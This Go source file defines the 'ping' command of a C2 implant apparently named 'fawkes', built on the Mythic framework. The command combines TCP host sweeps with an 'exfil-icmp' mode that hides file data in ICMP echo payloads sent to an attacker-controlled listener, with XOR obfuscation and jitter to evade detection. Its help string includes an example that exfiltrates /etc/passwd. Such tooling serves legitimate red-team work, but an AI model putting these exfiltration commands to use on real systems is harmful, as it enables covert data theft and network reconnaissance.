package agentfunctions

import (
	"encoding/json"
	"fmt"
	"path/filepath"

	agentstructs "github.com/MythicMeta/MythicContainer/agent_structs"
	mythicrpc "github.com/MythicMeta/MythicContainer/mythicrpc"
)

func init() {
	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
		Name: "ping",
		AssociatedBrowserScript: &agentstructs.BrowserScript{
			ScriptPath: filepath.Join(".", "fawkes", "browserscripts", "ping_new.js"),
			Author:     "@GlobeTech",
		},
		Description:         "TCP connect host reachability check with subnet sweep, and ICMP data exfiltration. Default: TCP ping. exfil-icmp: encode data in ICMP echo request payloads for covert exfiltration (T1048.003).",
		HelpString:          "ping -hosts 192.168.1.1\nping -hosts 192.168.1.0/24 -port 445 -timeout 1000 -threads 25\nping -action exfil-icmp -target 10.0.0.5 -file /etc/passwd -chunk_size 1024 -delay 100",
		Version:             2,
		Author:              "@galoryber",
		MitreAttackMappings: []string{"T1018", "T1048.003", "T1095"},
		CommandAttributes: agentstructs.CommandAttribute{
			SupportedOS: []string{
				agentstructs.SUPPORTED_OS_WINDOWS,
				agentstructs.SUPPORTED_OS_LINUX,
				agentstructs.SUPPORTED_OS_MACOS,
			},
		},
		CommandParameters: []agentstructs.CommandParameter{
			{
				Name:          "action",
				CLIName:       "action",
				Description:   "Action: empty/ping (TCP reachability), exfil-icmp (data exfiltration via ICMP payloads)",
				DefaultValue:  "",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_CHOOSE_ONE,
				Choices:       []string{"", "exfil-icmp"},
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
					{ParameterIsRequired: true, GroupName: "ICMP Exfil"},
				},
			},
			{
				Name:                 "hosts",
				CLIName:              "hosts",
				Description:          "Target host(s) — single IP, comma-separated, CIDR (192.168.1.0/24), or dash range (192.168.1.1-254)",
				DefaultValue:         "",
				DynamicQueryFunction: getActiveHostList,
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "Default"},
				},
			},
			{
				Name:          "port",
				CLIName:       "port",
				Description:   "TCP port to probe (default: 445)",
				DefaultValue:  445,
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:          "timeout",
				CLIName:       "timeout",
				Description:   "Timeout per host in milliseconds (default: 1000)",
				DefaultValue:  1000,
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			{
				Name:          "threads",
				CLIName:       "threads",
				Description:   "Concurrent connections (default: 25, max: 100)",
				DefaultValue:  25,
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "Default"},
				},
			},
			// ICMP Exfil parameters
			{
				Name:                 "target",
				CLIName:              "target",
				Description:          "Destination IP for ICMP exfil packets (attacker-controlled listener)",
				DefaultValue:         "",
				DynamicQueryFunction: getActiveHostList,
				ParameterType:        agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: true, GroupName: "ICMP Exfil"},
				},
			},
			{
				Name:          "file",
				CLIName:       "file",
				Description:   "File path to exfiltrate via ICMP",
				DefaultValue:  "",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "ICMP Exfil"},
				},
			},
			{
				Name:          "data",
				CLIName:       "data",
				Description:   "Raw string data to exfiltrate via ICMP (alternative to file)",
				DefaultValue:  "",
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_STRING,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "ICMP Exfil"},
				},
			},
			{
				Name:          "chunk_size",
				CLIName:       "chunk_size",
				Description:   "Bytes per ICMP payload (default: 1024, max: 1400)",
				DefaultValue:  1024,
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "ICMP Exfil"},
				},
			},
			{
				Name:          "delay",
				CLIName:       "delay",
				Description:   "Delay between ICMP packets in ms (default: 100)",
				DefaultValue:  100,
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "ICMP Exfil"},
				},
			},
			{
				Name:          "jitter",
				CLIName:       "jitter",
				Description:   "Max additional random delay in ms (default: 50)",
				DefaultValue:  50,
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "ICMP Exfil"},
				},
			},
			{
				Name:          "xor_key",
				CLIName:       "xor_key",
				Description:   "XOR encoding key (0-255, 0=none). Basic obfuscation to avoid plaintext in ICMP payloads",
				DefaultValue:  0,
				ParameterType: agentstructs.COMMAND_PARAMETER_TYPE_NUMBER,
				ParameterGroupInformation: []agentstructs.ParameterGroupInfo{
					{ParameterIsRequired: false, GroupName: "ICMP Exfil"},
				},
			},
		},
		TaskFunctionParseArgString: func(args *agentstructs.PTTaskMessageArgsData, input string) error {
			if input == "" {
				return nil
			}
			return args.LoadArgsFromJSONString(input)
		},
		TaskFunctionParseArgDictionary: func(args *agentstructs.PTTaskMessageArgsData, input map[string]interface{}) error {
			return args.LoadArgsFromDictionary(input)
		},
		TaskFunctionOPSECPre: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTTaskOPSECPreTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			var msg string
			if action == "exfil-icmp" {
				target, _ := taskData.Args.GetStringArg("target")
				msg = fmt.Sprintf("OPSEC CRITICAL: ICMP data exfiltration to %s (T1048.003). "+
					"Data is encoded in ICMP Echo Request payloads. "+
					"Deep packet inspection (DPI) and ICMP payload anomaly detection will flag oversized or patterned ICMP traffic. "+
					"Network monitoring tools log all ICMP traffic. "+
					"Requires root/admin for raw ICMP sockets.", target)
			} else {
				hosts, _ := taskData.Args.GetStringArg("hosts")
				msg = fmt.Sprintf("OPSEC WARNING: TCP ping to %s generates network traffic. Network monitoring tools, IDS/IPS, and host firewalls may log connection attempts as network reconnaissance activity.", hosts)
			}
			return agentstructs.PTTTaskOPSECPreTaskMessageResponse{
				TaskID:             taskData.Task.ID,
				Success:            true,
				OpsecPreBlocked:    false,
				OpsecPreMessage:    msg,
				OpsecPreBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionOPSECPost: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskOPSECPostTaskMessageResponse {
			action, _ := taskData.Args.GetStringArg("action")
			var msg string
			if action == "exfil-icmp" {
				msg = "OPSEC AUDIT: ICMP exfiltration completed. ICMP Echo Requests with data payloads were sent. " +
					"IDS signatures for ICMP tunneling (large payloads, high frequency) may have been triggered. " +
					"Review network logs for anomalous ICMP traffic patterns."
			} else {
				msg = "OPSEC AUDIT: Network ping/sweep completed. TCP connection attempts are logged by network monitoring, IDS/IPS, and host firewalls. Sweep patterns (sequential IPs, rapid requests) are high-confidence indicators of reconnaissance."
			}
			return agentstructs.PTTaskOPSECPostTaskMessageResponse{
				TaskID:              taskData.Task.ID,
				Success:             true,
				OpsecPostBlocked:    false,
				OpsecPostMessage:    msg,
				OpsecPostBypassRole: agentstructs.OPSEC_ROLE_OPERATOR,
			}
		},
		TaskFunctionCreateTasking: func(taskData *agentstructs.PTTaskMessageAllData) agentstructs.PTTaskCreateTaskingMessageResponse {
			response := agentstructs.PTTaskCreateTaskingMessageResponse{Success: true, TaskID: taskData.Task.ID}
			action, _ := taskData.Args.GetStringArg("action")
			if action == "exfil-icmp" {
				target, _ := taskData.Args.GetStringArg("target")
				filePath, _ := taskData.Args.GetStringArg("file")
				display := fmt.Sprintf("exfil-icmp → %s (file: %s)", target, filePath)
				response.DisplayParams = &display
				createArtifact(taskData.Task.ID, "ICMP Raw Socket", fmt.Sprintf("ICMP exfil to %s", target))
			} else {
				hosts, _ := taskData.Args.GetStringArg("hosts")
				display := hosts
				response.DisplayParams = &display
			}
			return response
		},
		TaskFunctionProcessResponse: func(processResponse agentstructs.PtTaskProcessResponseMessage) agentstructs.PTTaskProcessResponseMessageResponse {
			response := agentstructs.PTTaskProcessResponseMessageResponse{TaskID: processResponse.TaskData.Task.ID, Success: true}
			responseText, ok := processResponse.Response.(string)
			if !ok || responseText == "" {
				return response
			}
			// Track ICMP exfil events
			var result struct {
				Target    string `json:"target"`
				FileName  string `json:"filename"`
				TotalSize int    `json:"total_size"`
				SentPkts  int    `json:"sent_packets"`
			}
			if err := json.Unmarshal([]byte(responseText), &result); err == nil && result.Target != "" {
				_, _ = mythicrpc.SendMythicRPCArtifactCreate(mythicrpc.MythicRPCArtifactCreateMessage{
					TaskID:           processResponse.TaskData.Task.ID,
					BaseArtifactType: "Exfiltration",
					ArtifactMessage: fmt.Sprintf("ICMP exfil: %s (%d bytes, %d packets) → %s",
						result.FileName, result.TotalSize, result.SentPkts, result.Target),
				})
			}
			return response
		},
	})
}
